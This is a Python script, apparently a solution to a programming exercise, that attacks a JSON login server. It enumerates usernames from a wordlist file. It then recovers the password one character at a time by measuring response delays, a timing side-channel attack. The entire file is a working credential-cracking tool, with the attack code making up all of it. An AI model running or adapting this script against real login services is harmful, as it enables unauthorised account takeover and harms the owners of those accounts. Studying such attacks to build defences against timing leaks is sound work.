import sys
import socket
from string import ascii_letters, digits
import json
import datetime


def send_admin_json(client_socket, js):
    """
    :param client_socket: the connection to the server.
    :param js: the json object of the admin name and blank password.
    :return: True if it's the right admin user name.
    """
    client_socket.send(js.encode())
    rep = client_socket.recv(1024)
    re = json.loads(rep.decode())
    if re["result"] == "Wrong login!":
        return False
    # elif re["result"] == "Connection success!":
    #     return True
    elif re["result"] == "Wrong password!":
        return True



def send_json_pass(client_socket, js):
    """
    :param client_socket: the connection to the server.
    :param js: the json object of the admin name and blank password.
    :return: the answer from the server for the specific password. checking passwords for the right admin.
    """
    json_str = json.dumps(js, indent=4)
    client_socket.send(json_str.encode())
    rep = client_socket.recv(1024)
    re = json.loads(rep.decode())
    return re["result"]


def find_admin(client_socket):
    """
    :param client_socket: the connection to the server.
    :return: The correct  user name.
    """
    with open("logins.txt") as com_logins:
        for line in com_logins:
            s = line.rstrip()
            login_dic = {"login": s, "password": ""}
            json_str = json.dumps(login_dic, indent=4)
            re = send_admin_json(client_socket, json_str)
            if re:
                return login_dic


def find_pass(client_socket, login_dic):
    """

    :param client_socket: the connection to the server.
    :param login_dic: a pair of the correct admin to a blank password.
    :return: The correct pair of user name and password.
    """
    charset = ascii_letters + digits
    maxrange = 30
    try_dic = login_dic
    old_dic = {"password": try_dic["password"]}

    for i in range(0, maxrange):
        for let in charset:
            # print(try_dic)
            # old_dic["password"] = try_dic["password"]
            try_dic["password"] += let
            first = datetime.datetime.now()
            re = send_json_pass(client_socket, try_dic)
            secend = datetime.datetime.now()

            if re == "Connection success!":
                return try_dic
            elif (secend - first).total_seconds() > 0.01:
                old_dic["password"] = try_dic["password"]
                break
            else:
                try_dic["password"] = old_dic["password"]


def client(ip_add, port):
    """

    :param ip_add: Ip to connect to.
    :param port: port to connect to.
    :return: None.
    """
    with socket.socket() as client_socket:
        client_socket.connect((ip_add, int(port)))
        # response = dic_approach(client_socket)
        response = find_admin(client_socket)
        response = find_pass(client_socket, response)
        print(json.dumps(response, indent=4, sort_keys=True))


def main():
    """

    :return: None.
    """
    client(sys.argv[1], sys.argv[2])


main()
